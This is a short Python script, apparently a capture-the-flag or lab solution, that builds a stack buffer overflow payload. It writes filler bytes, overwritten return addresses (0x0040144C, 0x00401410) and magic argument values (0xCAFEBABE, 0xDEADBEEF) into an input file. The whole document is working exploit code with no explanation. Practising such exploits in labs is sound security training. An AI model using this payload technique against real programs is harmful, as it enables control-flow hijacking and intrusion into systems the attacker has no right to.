from struct import *

def pack_int(num):
	return pack('I', num)

with open('a', 'wb') as f:
	f.write(b'1111\n')
	f.write(b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJKKKKLLLL' + pack_int(0x0040144C))
	f.write(pack_int(0xCAFEBABE) + b'GGGG' + pack_int(0x00401410) + b'aaaa')
	f.write(pack_int(0xDEADBEEF) + b'\n')
